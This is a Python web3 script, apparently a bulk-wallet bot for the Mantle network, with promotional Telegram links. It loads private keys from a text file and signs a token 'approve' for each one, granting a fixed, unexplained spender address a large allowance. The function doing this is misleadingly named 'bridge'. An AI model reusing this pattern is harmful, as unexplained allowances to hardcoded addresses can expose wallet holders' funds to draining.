from web3 import Web3, Account
import json
from datetime import datetime, timedelta
rpc_eth = 'https://mantle-mainnet.public.blastapi.io'
w3 = Web3(Web3.HTTPProvider(rpc_eth))
# https://t.me/mallinmakin
# https://t.me/mallinmakin
# https://t.me/mallinmakin
ERC20_ABI = json.loads('''[ { "type": "constructor", "inputs": [ { "type": "address", "name": "implementationContract", "internalType": "address" } ] }, { "type": "function", "stateMutability": "view", "outputs": [ { "type": "address", "name": "", "internalType": "address" } ], "name": "admin", "inputs": [] }, { "type": "function", "stateMutability": "nonpayable", "outputs": [], "name": "changeAdmin", "inputs": [ { "type": "address", "name": "newAdmin", "internalType": "address" } ] }, { "type": "function", "stateMutability": "view", "outputs": [ { "type": "address", "name": "", "internalType": "address" } ], "name": "implementation", "inputs": [] }, { "type": "function", "stateMutability": "nonpayable", "outputs": [], "name": "upgradeTo", "inputs": [ { "type": "address", "name": "newImplementation", "internalType": "address" } ] }, { "type": "function", "stateMutability": "payable", "outputs": [], "name": "upgradeToAndCall", "inputs": [ { "type": "address", "name": "newImplementation", "internalType": "address" }, { "type": "bytes", "name": "data", "internalType": "bytes" } ] }, { "type": "function", "stateMutability": "nonpayable", "outputs": [ { "type": "bool", "name": "", "internalType": "bool" } ], "name": "approve", "inputs": [ { "type": "address", "name": "spender", "internalType": "address" }, { "type": "uint256", "name": "value", "internalType": "uint256" } ] }, { "type": "event", "name": "AdminChanged", "inputs": [ { "type": "address", "name": "previousAdmin", "indexed": false }, { "type": "address", "name": "newAdmin", "indexed": false } ], "anonymous": false }, { "type": "event", "name": "Upgraded", "inputs": [ { "type": "address", "name": "implementation", "indexed": false } ], "anonymous": false }, { "type": "fallback" } ]''')

eth_contract_address = Web3.to_checksum_address('0x09Bc4E0D864854c6aFB6eB9A9cdF58aC190D0dF9')
eth_contract = w3.eth.contract(eth_contract_address, abi=ERC20_ABI)


def bridge(account):
    address = account.address
    nonce = w3.eth.get_transaction_count(address)


    transaction = eth_contract.functions.approve('0xc9066F8aA7976e547a9E5bB4d0851d78FE461EC7', 999999999 ).build_transaction({
        'chainId': w3.eth.chain_id,
        'gas': 100000,
        'gasPrice': w3.eth.gas_price,
        'from': address,
        'nonce': nonce,
        'value': 0

    })
    signed_txn = w3.eth.account.sign_transaction(transaction, private_key=account.key)
    txn = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
    return txn


txt = 'privates.txt'
with open(txt, 'r', encoding='utf-8') as keys_file:
    accounts = [Account.from_key(line.replace("\n", "")) for line in keys_file.readlines()]
    for account in accounts:
        txn = bridge(account)
        print(f'https://explorer.mantle.xyz/tx/{txn.hex()}')